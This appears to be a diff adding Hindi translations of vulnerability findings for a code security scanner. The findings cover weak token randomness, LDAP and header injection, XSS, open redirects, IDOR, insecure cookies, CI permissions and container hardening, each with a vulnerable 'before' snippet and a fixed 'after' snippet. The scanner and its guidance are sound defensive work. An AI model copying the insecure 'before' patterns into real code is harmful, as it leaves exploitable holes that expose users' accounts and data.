+      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # सिर्फ़ वह ज़्यादा स्पेसिफ़िक रोल जो वाकई ज़रूरी है, पूरी subscription पर Owner नहीं\n}`,
+    },
+  },
+  "weak-random-token": {
+    title: "कोई सिक्योरिटी टोकन ऐसे रैंडम नंबर जनरेटर से बनाया गया है जो क्रिप्टोग्राफ़िकली सुरक्षित नहीं है",
+    description:
+      "token/session/reset/otp/csrf जैसे नाम वाली वैल्यू Math.random() (JS), random.random() (Python) या rand() (PHP) से जनरेट की जाती है — ऐसे जनरेटर जो सुरक्षा के लिए नहीं बनाए गए, जिनके सीक्वेंस अनुमान लगाए जा सकते हैं। इस तरह बना टोकन अंदाज़ा लगाया या फिर से बनाया जा सकता है, जिस मकसद के लिए वह बना है वही खत्म हो जाता है (जैसे पासवर्ड रीसेट लिंक जिसे कोई भी पहले से अनुमान लगा सके)।",
+    fix: {
+      before: `const resetToken = Math.random().toString(36).slice(2);`,
+      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, Math.random नहीं — अप्रत्याशित`,
+    },
+  },
+  "ldap-injection": {
+    title: "कोई LDAP फ़िल्टर रिक्वेस्ट की वैल्यू को सीधे जोड़कर बनाया गया है",
+    description:
+      'LDAP फ़िल्टर बनाने वाली कोई लाइन (जैसे "(uid=...)") बिना LDAP के स्पेशल कैरेक्टर्स का escape किए, सीधे रिक्वेस्ट से ली गई वैल्यू शामिल करती है। जो उस वैल्यू को कंट्रोल करता है, वह फ़िल्टर का लॉजिक बदल सकता है — जैसे किसी ऑथेंटिकेशन चेक को बायपास करना या डायरेक्टरी का ऐसा डेटा पढ़ना जो उसे नहीं देखना चाहिए।',
+    fix: {
+      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
+      after: "const filter = `(uid=${ldapEscape(req.body.username)})`; // फ़िल्टर में इस्तेमाल करने से पहले LDAP के स्पेशल कैरेक्टर्स का escape हमेशा करना चाहिए\nclient.search(base, { filter });",
+    },
+  },
+  "xss-dangerous-html": {
+    title: "यूज़र्स द्वारा लिखा गया टेक्स्ट ब्राउज़र में कोड चला सकता है",
+    description:
+      "कंटेंट को प्लेन टेक्स्ट की बजाय raw HTML के रूप में पेज में डाला जाता है (dangerouslySetInnerHTML, v-html, .innerHTML)। अगर उस कंटेंट में यूज़र इनपुट शामिल है, तो इसमें ऐसे स्क्रिप्ट हो सकते हैं जो पेज पढ़ने वाले के ब्राउज़र में चल जाएं।",
+    fix: {
+      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
+      after: `<div>{comment.text}</div>\n// या, अगर HTML चाहिए: DOMPurify.sanitize(comment.text)`,
+    },
+  },
+  "public-storage-bucket": {
+    title: "अपलोड की गई फ़ाइलों की जगह किसी के भी लिए दिखाई देती है",
+    description:
+      "कोई storage bucket (Supabase Storage, S3) पब्लिक के रूप में कॉन्फ़िगर है। अगर इसमें यूज़र्स द्वारा अपलोड किए गए डॉक्यूमेंट, फ़ोटो या फ़ाइलें हैं, तो जो कोई भी पाथ जानता है — या अंदाज़ा लगा लेता है — वह बिना ऑथेंटिकेशन के एक्सेस कर सकता है।",
+    fix: {
+      before: `supabase.storage.createBucket("uploads", { public: true })`,
+      after: `supabase.storage.createBucket("uploads", { public: false })\n// फ़ाइलें समय-सीमित signed URL से सर्व करें: createSignedUrl(path, 60)`,
+    },
+  },
+  "csrf-state-changing-get": {
+    title: "डेटा डिलीट या बदलने के लिए सिर्फ़ एक लिंक काफ़ी है",
+    description:
+      "कोई GET route ऐसा ऑपरेशन करता है जो डेटा बदल देता है (पाथ में delete/remove/update/edit शामिल है)। GET रिक्वेस्ट सिर्फ़ किसी लिंक पर जाने या किसी बाहरी साइट से इमेज लोड होने पर भी चल जाती हैं — यह CSRF अटैक के लिए क्लासिक शुरुआती बिंदु है।",
+    fix: {
+      before: `router.get("/posts/:id/delete", deletePost)`,
+      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
+    },
+  },
+  "insecure-token-storage": {
+    title: "ब्राउज़र में सेव किए गए लॉगिन डेटा अच्छी तरह सुरक्षित नहीं हैं",
+    description:
+      "कोई एक्सेस टोकन localStorage में सेव किया जाता है। httpOnly कुकी के उलट, पेज में चलने वाली कोई भी स्क्रिप्ट (XSS के ज़रिए इंजेक्ट किए गए दुर्भावनापूर्ण स्क्रिप्ट सहित) इसे पढ़ सकती है और चुरा सकती है।",
+    fix: {
+      before: `localStorage.setItem("authToken", token)`,
+      after: `// टोकन को सर्वर से httpOnly कुकी के रूप में सेट करें:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "open-redirect": {
+    title: "साइट का इस्तेमाल किसी धोखाधड़ी वाली साइट पर रीडायरेक्ट करने के लिए किया जा सकता है",
+    description:
+      "साइट यह जांचे बिना कि वह कोई जाना-पहचाना डोमेन है, यूज़र को सीधे रिक्वेस्ट (query, body, params) से लिए गए पते पर रीडायरेक्ट करती है। ऐसा लिंक जो आपकी साइट की ओर जाता दिखे, असल में फ़िशिंग पेज पर ले जा सकता है।",
+    fix: {
+      before: `res.redirect(req.query.next)`,
+      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
+    },
+  },
+  idor: {
+    title: "पते में कोई नंबर बदलने से किसी और का डेटा दिख सकता है",
+    description:
+      "कोई डेटाबेस क्वेरी यह जांचे बिना कि वह अनुरोध करने वाले यूज़र का है, सीधे URL से लिया गया आइडेंटिफ़ायर (req.params.id) इस्तेमाल करती है। पते में id बदलने से किसी और यूज़र के डेटा का एक्सेस मिल सकता है — Insecure Direct Object Reference।",
+    fix: {
+      before: `const order = await Order.findById(req.params.id)`,
+      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
+    },
+  },
+  "no-login-rate-limit": {
+    title: "लगातार बहुत सारे प्रयासों को लॉगिन फ़ॉर्म नहीं रोकता",
+    description:
+      "फ़ाइल में कोई login route डिफ़ाइन है, लेकिन उसी फ़ाइल में किसी rate-limiting मिडलवेयर का कोई निशान नहीं है। प्रयासों की कोई सीमा न होने पर, कोई हमलावर बिना धीमा हुए क्रम से पासवर्ड आज़मा सकता है (brute force)।",
+    fix: {
+      before: `router.post("/login", loginHandler)`,
+      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
+    },
+  },
+  "sensitive-data-in-logs": {
+    title: "पासवर्ड या संवेदनशील डेटा लॉग में पहुंच जाते हैं",
+    description:
+      "console.log (या इसी तरह की) कॉल में password, token, secret या apiKey नाम का कोई वेरिएबल शामिल है। अगर ये लॉग किसी बाहरी सर्विस या फ़ाइल में पहुंच जाएं, तो संवेदनशील डेटा ज़रूरत से कहीं ज़्यादा समय तक उजागर रहता है।",
+    fix: {
+      before: `console.log("login attempt", { email, password })`,
+      after: `console.log("login attempt", { email })`,
+    },
+  },
+  "header-injection": {
+    title: "रिक्वेस्ट की कोई वैल्यू सीधे HTTP रिस्पॉन्स हेडर में पहुंच जाती है",
+    description:
+      "कोई HTTP रिस्पॉन्स हेडर यह जांचे बिना कि उसमें लाइन ब्रेक (CRLF) तो नहीं है, सीधे रिक्वेस्ट (query, body, params) से ली गई वैल्यू से सेट होता है। कोई हमलावर अतिरिक्त हेडर या यहां तक कि पूरा अलग रिस्पॉन्स भी डाल सकता है — response splitting — जिससे वह कैशिंग, कुकी या दूसरे यूज़र्स को दिखने वाला कंटेंट मैनिपुलेट कर सकता है।",
+    fix: {
+      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
+      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
+    },
+  },
+  "gha-unpinned-action": {
+    title: "CI में कोई थर्ड-पार्टी action किसी तय वर्शन (commit SHA) पर लॉक नहीं है",
+    description:
+      'वर्कफ़्लो कोई थर्ड-पार्टी action इस्तेमाल करता है जिसे commit SHA की बजाय tag या branch (जैसे "@v1", "@main") से रेफ़र किया गया है। उसे मेंटेन करने वाला — या उसका अकाउंट कॉम्प्रोमाइज़ करने वाला — किसी भी समय उस रेफ़रेंस को किसी दूसरे commit पर ले जा सकता है, CI में क्या चल रहा है इसे चुपचाप बदल सकता है, उसके सीक्रेट्स के एक्सेस के साथ। कोई commit SHA हमेशा बिल्कुल एक ही कोड की ओर इशारा करता है।',
+    fix: {
+      before: `uses: some-org/some-action@v1`,
+      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, commit SHA पर लॉक — वर्शन अपडेट करते समय SHA भी अपडेट करें`,
+    },
+  },
+  "gha-excessive-permissions": {
+    title: "वर्कफ़्लो सिर्फ़ इस्तेमाल होने वाली परमिशन की बजाय टोकन की सभी परमिशन खुद को दे देता है",
+    description:
+      '"permissions: write-all" वर्कफ़्लो के GITHUB_TOKEN को सब कुछ में राइट एक्सेस दे देता है — issue, pull request, पैकेज, डिप्लॉयमेंट — भले ही वर्कफ़्लो इसका सिर्फ़ एक हिस्सा इस्तेमाल करता हो। अगर वर्कफ़्लो का कोई स्टेप कॉम्प्रोमाइज़ हो जाए (कोई दुर्भावनापूर्ण डिपेंडेंसी, इंजेक्ट किया गया स्क्रिप्ट), तो वे ज़्यादा परमिशन इसका फ़ायदा उठाने वाले की क्षमता बढ़ा देती हैं।',
+    fix: {
+      before: `permissions: write-all`,
+      after: `permissions:\n  contents: read\n  pull-requests: write  # सिर्फ़ वे परमिशन जो वर्कफ़्लो वाकई इस्तेमाल करता है`,
+    },
+  },
+  "insecure-cookie-flags": {
+    title: "सेशन या ऑथेंटिकेशन कुकी Secure और HttpOnly फ़्लैग के बिना सेट है",
+    description:
+      'सेशन/ऑथ/टोकन जैसे नाम वाली कोई कुकी अपने ऑप्शन में "httpOnly" और "secure" के बिना सेट है। httpOnly के बिना, पेज में मौजूद JavaScript — XSS से इंजेक्ट किया गया कोड भी — उस कुकी को पढ़ सकता है। secure के बिना, यह बिना एन्क्रिप्ट किए HTTP कनेक्शन पर भी भेजी जा सकती है।',
+    fix: {
+      before: `res.cookie("session", sessionId)`,
+      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "vulnerable-dependency": (original) => ({
+    title: original.title.replace("Dipendenza vulnerabile:", "भेद्य डिपेंडेंसी:"),
+    description: original.description,
+    fix: {
+      before: original.fix.before,
+      after: original.fix.after.replace(
+        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
+        "अभी तक कोई ठीक किया गया वर्शन ज्ञात नहीं है — कोई वैकल्पिक पैकेज आज़माएं या प्रोजेक्ट के अपडेट फ़ॉलो करें।"
+      ),
+    },
+  }),
+  "docker-missing-user": {
+    title: "Dockerfile non-root यूज़र सेट नहीं करता",
+    description:
+      "Dockerfile में कोई USER इंस्ट्रक्शन नहीं है: इसे तय किए बिना कंटेनर root की तरह चलता है। अगर कोई हमलावर कंटेनर के अंदर कोड चलाने में कामयाब हो जाए (जैसे किसी वल्नरेबल लाइब्रेरी का फ़ायदा उठाकर), तो कंटेनर के अंदर root होना होस्ट तक पहुंचना या आसपास के सिस्टम पर व्यापक असर आसान बना देता है।",
+    fix: {
+      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
+      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
+    },
+  },
+  "k8s-missing-run-as-non-root": {
+    title: "Kubernetes मैनिफ़ेस्ट साफ़ तौर पर non-root यूज़र के रूप में एक्ज़ीक्यूशन लागू नहीं करता",
+    description:
+      'मैनिफ़ेस्ट में कहीं भी "runAsNonRoot" नहीं है (न pod स्तर पर, न कंटेनर स्तर पर): इसे सेट किए बिना, कंटेनर उसी यूज़र के रूप में चलता है जो उसकी इमेज में तय है — अक्सर डिफ़ॉल्ट रूप से root, अगर इमेज ने खुद इसे नहीं बदला। इसे साफ़ तौर पर true सेट करने से, अगर इमेज फिर भी root के रूप में चलने की कोशिश करे तो pod का स्टार्ट होना फ़ेल हो जाता है, न कि किसी घटना के बाद ही इसका पता चले।',
+    fix: {
+      before: `containers:\n  - name: app\n    image: myapp:1.0`,
+      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
+    },
+  },
+  "docker-unpinned-base-image": {
+    title: 'Dockerfile की base इमेज ":latest" टैग इस्तेमाल करती है',
+    description:
+      'कोई FROM इंस्ट्रक्शन सटीक वर्शन की बजाय साफ़ तौर पर ":latest" टैग इस्तेमाल करता है। "latest" समय के साथ बदलता है: वही बिल्ड, किसी दूसरे समय दोबारा चलाने पर, base इमेज का अलग वर्शन पा सकता है — यानी ऐसा बिल्ड जो दोहराया नहीं जा सकता, और कोई अनचाहा अपडेट बिना किसी के तय किए आ सकता है।',
+    fix: {
+      before: `FROM node:latest`,
+      after: `FROM node:20.11-slim`,
+    },
+  },
+  "docker-add-remote-url": {
+    title: "Dockerfile COPY की बजाय ADD से कोई रिमोट फ़ाइल डाउनलोड करता है",
+    description:
+      "http/https URL वाला ADD इंस्ट्रक्शन बिल्ड के दौरान इंटरनेट से कोई फ़ाइल डाउनलोड करता है, बिना इंटीग्रिटी चेक के और रिपॉज़िटरी में कंटेंट दिखे बिना। अगर वह URL भविष्य में कॉम्प्रोमाइज़ हो जाए, तो बिल्ड बिना किसी को Dockerfile पढ़ते हुए पता चले मनमाना कंटेंट शामिल कर लेता है।",
+    fix: {
+      before: `ADD https://example.com/install.sh /tmp/install.sh`,
+      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<अपेक्षित hash>  /tmp/install.sh" | sha256sum -c -`,
+    },
+  },
+},
 };
